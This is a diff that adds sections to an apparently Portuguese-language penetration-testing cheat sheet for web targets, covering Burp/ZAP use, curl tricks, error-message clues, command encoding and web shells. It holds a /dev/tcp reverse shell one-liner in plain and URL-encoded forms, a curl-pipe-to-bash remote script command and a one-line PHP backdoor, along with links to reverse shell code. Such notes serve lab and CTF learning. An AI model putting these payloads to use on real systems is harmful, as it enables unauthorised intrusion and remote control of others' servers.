@@ -399,3 +399,119 @@ e comando`
 1: Se o `debug` estiver habilitado, acesse `/console` e inicie o `RCE`
 
 2: `eval()`
+
+## Browser
+
+1: Combine o `Firefox` com o `Chrome`
+
+2: Use complementos convenientes (add-ons): `Wappalyzer`, `Cookie-Editor`, `Shodan`, `Hack-Tools`, `Foxproxy`, etc
+
+3: Se uma exploração não for bem sucedida, mude para `outro explorador`
+
+4: Dev Tool (Ferramentas de desenvolvimento)
+
+## Burpsuite and ZAP
+
+### Burpsuite
+
+1: Verifique os headers especiais
+
+2: `Comunicação/Dependência` com outros `serviços/portas`
+
+3: `Edite a solicitação` para ignorar o `controle de acesso`
+
+4: Como 3, edite a solicitação para `representar o usuário administrador`
+
+5: Analise a `API`
+
+### ZAP
+
+1: Como o `BurpSuite`
+
+2: Quando se trata de `força bruta`, tem uma `velocidade muito maior`
+
+## Curl
+
+1: Acesse pelo método `GET` e verifique os cabeçalhos: `curl http://10.10.10.10`
+
+2: Envie uma solicitação `POST`: `curl -X POST --data "id=123" http://10.10.10.10`
+
+3: Alterne entre `POST` e `GET` para testar os endpoints da `API`
+
+4: Escreva um script para `fuzz`
+
+5: `Baixe` o arquivo: `curl http://10.10.10.10/file -o file`
+
+6: Execute um `script remoto`: `curl http://10.10.10.10/shell.sh | bash`
+
+## Error Messages
+
+1: `Preenchimento incorreto` ==> Existência de `codificação`, como `Base64`
+
+2: `Nenhum arquivo ou diretório` ==> Possível `LFI/RFI`
+
+3: não é possível `registrar` este nome de usuário ==> Este nome de usuário `existe`
+
+4: Acesse uma `URL inexistente` ==> Revelar `todos os caminhos (Rail)`
+
+## Encoding
+
+### Encode command in HTTP Request
+
+1: Codificação/decodificação online: https://www.urlencoder.org/
+
+2: Às vezes, apenas `alguns caracteres` serão codificados
+
+### Encode command in Python function
+
+1: Substitua `'+'` por `''`. Por exemplo, `sh -i >& /dev/tcp/192.168.49.175/6000 0>&1 ==> sh+-i >& /dev/tcp/192.168.49.175/6000+0`
+
+### Encode command in Python function in HTTP Request
+
+1: Use a codificação de URL primeiro
+
+2: Substitua `'%20'` por `'+'`. Por exemplo, `sh -i >& /dev/tcp/192.168.49.175/6000 0>&1 ==> sh+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.175%2F6000+0%3E%261`
+
+## Web Shell
+
+1: PHP generic
+
+One-line backdoor: `<?php echo shell exec($_GET['cmd'].' 2>&1');`
+
+Web backdoor: https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php
+
+Web backdoor2: https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php
+
+2: PHP for Windows
+
+Reverse Shell: https://github.com/Dhayalanb/windows-php-reverse-shell
+
+Bind Shell: Check [PHP generic]
+
+3: PHP for Linux
+
+Reverse Shell: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+4: JSP
+
+Reverse Shell: https://github.com/tennc/webshell/blob/master/jsp/jsp-reverse.jsp
+
+5: ASPX
+
+Reverse Shell: https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.asp
+
+6: Others
+
+Ruby reverse shell: https://github.com/secjohn/ruby-shells/blob/master/revshell.rb
+
+Ruby bind shell: https://github.com/secjohn/ruby-shells/blob/master/shell.rb
+
+## Cryptography
+
+1: Escreva um `script python`
+
+2: Faça uso de `ferramenta online`
+
+## Unnecessary Authentication
+
+Às vezes, a autenticação é `inútil` ou `desnecessária` para nossa exploração. Não há necessidade de crack login (brute force)
